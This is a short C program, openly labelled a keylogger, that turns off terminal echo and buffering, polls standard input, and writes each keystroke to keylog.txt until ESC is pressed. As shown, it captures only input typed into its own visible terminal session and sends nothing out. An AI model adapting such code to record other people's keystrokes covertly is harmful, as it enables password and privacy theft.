#include <stdio.h>
#include <termios.h>
#include <unistd.h>
#include <fcntl.h>

// Disable input buffering and echo
void disableInputBuffering() {
    struct termios t;
    tcgetattr(STDIN_FILENO, &t);
    t.c_lflag &= ~(ICANON | ECHO); // Disable canonical mode and echoing
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
}

// Restore terminal settings
void restoreInputBuffering() {
    struct termios t;
    tcgetattr(STDIN_FILENO, &t);
    t.c_lflag |= (ICANON | ECHO); // Re-enable canonical mode and echoing
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
}

// Check for a pressed key
int keyPressed() {
    int oldFlags = fcntl(STDIN_FILENO, F_GETFL);
    fcntl(STDIN_FILENO, F_SETFL, oldFlags | O_NONBLOCK);

    int ch = getchar();

    fcntl(STDIN_FILENO, F_SETFL, oldFlags); // Restore flags
    return (ch != EOF) ? ch : 0;
}

int main() {
    FILE *logFile = fopen("keylog.txt", "a");
    if (!logFile) {
        perror("Error opening log file");
        return 1;
    }

    printf("Keylogger running... Press ESC to exit.\n");

    disableInputBuffering();
    while (1) {
        int key = keyPressed();
        if (key) {
            if (key == 27) // Exit on ESC key
                break;

            fprintf(logFile, "%c", key);
            fflush(logFile);
        }
        usleep(10000); // Reduce CPU usage
    }
    restoreInputBuffering();

    fclose(logFile);
    printf("Keylogger stopped. Keys logged to 'keylog.txt'.\n");
    return 0;
}
